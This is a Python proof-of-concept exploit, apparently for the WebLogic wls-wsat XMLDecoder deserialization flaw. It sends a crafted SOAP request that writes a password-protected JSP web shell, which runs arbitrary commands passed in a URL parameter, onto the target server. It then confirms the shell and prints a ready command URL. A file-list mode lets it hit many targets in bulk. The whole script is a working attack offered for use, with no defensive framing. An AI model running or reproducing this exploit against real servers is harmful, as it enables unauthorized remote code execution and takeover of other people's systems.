#coding=utf-8
import requests,urlparse
import sys
heads = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Content-Type': 'text/xml;charset=UTF-8',
    }

def getShell(url):
    data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<%
    if("ty".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;          
        byte[] b = new byte[204800];
        out.print("<pre>");          
        while((a=in.read(b))!=-1){
            out.println(new String(b));          
        }
        out.print("</pre>");
    } 
    out.print("test"); 
    %>]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>'''
    try:
        req = requests.post(url+'/wls-wsat/CoordinatorPortType', data=data,verify=False, timeout=3, headers=heads)
        print(req.content)
        req.close()
    except Exception as e:
        print(e)
    try:
        req = requests.get(url+'/bea_wls_internal/test.jsp', timeout=3,verify=False)
        print(req)
        if 'test' in req.content.lower():
            print(url+'/bea_wls_internal/test.jsp?pwd=ty&cmd=whoami')
        req.close()
    except Exception as e:
        print(e)
if __name__ == '__main__':
    if len(sys.argv) == 1:
        print("python this_poc_name.py url:port \npython this_poc_name.py -f task_file.txt")
        exit(0)
    elif sys.argv[1] == "-f":
        with open(sys.argv[2], 'r') as file:
            for each in file.readlines():
                each = each.strip()
                result = getShell(each)

    else:
        url = sys.argv[1]
        result = getShell(url)
        print(result)

